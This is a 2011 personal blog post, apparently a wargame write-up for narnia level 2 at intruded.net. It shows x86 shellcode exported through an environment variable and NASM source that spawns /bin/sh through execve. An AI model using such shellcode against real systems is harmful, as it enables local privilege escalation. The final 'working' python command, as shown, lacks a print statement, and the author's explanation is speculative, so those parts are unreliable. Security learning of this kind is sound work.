---
categories: coding, capture the flag, wargames
date: 2011/09/19 22:43:06
guid: http://kenko.co/?p=38

tags: shellcode, intruded.net, narnia, x86
title: 'intruded.net, narnia: level 2'
permalink: intruded.net-narnia:-level-2
---
So, the previous shellcode exercise was inspired by my failure to pass level 2 of narnia @ intruded.net. Continuing, I found answers online because I wanted to know what I was doing wrong. At first, I tried: 

$$code(lang=bash)
export EGG="\x31\xc0\xb0\x1d\xcd\x80"
./level2
$$/code

But that would always end in a segmentation fault. Rewrote the nasm file, created a binary, did the objdump -d again on the target this time. Same resulting hexcode. 

So, looking online (cheating, I know), I found that a particular solution is to do this:

$$code(lang=bash)
export EGG=`python -c 'print "\x90" * 128 +  "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"'`
$$/code
(from <a href="http://binholic.blogspot.com/2010/08/wargame-narnia-at-intrudednet-level-2.html">binary world</a>)

Now, that left me with the idea that this NOP slide is actually necessary. To test the idea:

$$code(lang=bash)
export EGG=`python -c 'print "\x90" * 128 + "\x31\xc0\xb0\x1d\xcd\x80"'`
$$/code

To my dismay, this worked! The level2 binary appeared to be in a pause() state--waiting for my interrupt. The difference here is that we use python to actually print out the shellcode; but still, the question of whether the NOP slide is necessary is left unanswered. To test, we try:

$$code(lang=bash)
export EGG=`python -c 'print "\x31\xc0\xb0\x1d\xcd\x80"'`
$$/code

This works--now we know the NOP slide is unnecessary. Now I want to verify if the python print is anything special, so I replace it with a perl -e call:

$$code(lang=bash)
export EGG=`perl -e 'print "\x31\xc0\xb0\x1d\xcd\x80"'`
$$/code

<em>Interesting</em>. The fundamental difference between my attempts at calling shellcode from the environment variable, and the working attempt, is the need to print out the hexcode. I didn't think this would be necessary, but I suppose it makes sense--something to add to my todo list of "things to understand". 

<em>My initial guess is that when we call ret(); from the binary, we need python or perl or bash or whatever to print out the shellcode so that the program knows what machine code to actually run. Would this then be run in the .data portion of the binary? Haven't thought about these things in months...</em>

Moving on to shellcode that will execute an actual shell.

$$code(lang=bash)
export EGG=`python -c '"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x1e\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42\x42"'`
$$/code

<strong>This is eventually what worked.</strong> 

The assembly that created this:

$$code(lang=asm)
;
; file: execve.asm
; author: Ken Ko
;
; description: runs a /bin/sh shell using execve. turn off ASLR, thanks.
;
; compile:      nasm -felf execve.asm && ld -m elf_i386 -o execve execve.o
;

    SECTION .text           ; code section
    global main             ; make label available to linker as invoked by gcc
    global _start           ; make label available to linker w/ default entry
main:                       ; standard  gcc  entry point
_start:
    xor eax,eax             ; clean up registers
    xor ebx,ebx
    xor ecx,ecx
    xor edx,edx

    jmp short ender

    starter:

    pop ebx                 ; get address of string "/bin/sh#AAAABBBB"
    xor eax,eax             ; clean up registers

    mov byte [ebx+7 ], al   ; put a NULL in N
    mov [ebx+8 ], ebx       ; put address of the string in AAAA
    mov [ebx+12], eax       ; put 4 NULL in BBBB

    mov al, 11              ; syscall for execve
    lea ecx, [ebx+8]        ; load the address of the string location
    lea edx, [ebx+12]       ; load the address of the NULLs
    int 0x80                ; enter kernel mode

    xor eax,eax
    xor ebx,ebx
    mov byte al, 0x1
    int 0x80

    ender:
    call starter            ; put the address of the string on the stack
    db '/bin/sh#AAAABBBB'
$$/code
<br>
I can go into detail later on, if I want. The comments should be enough, though.
<br>
<em>References</em>
<a href="http://asm.sourceforge.net/syscall.html">syscall list</a>
<a href="http://www.vividmachines.com/shellcode/shellcode.html#rt">vivid machines shellcode tutorial</a>
<a href="http://www.safemode.org/files/zillion/shellcode/doc/Writing_shellcode.html">safemode shellcode tutorial</a>

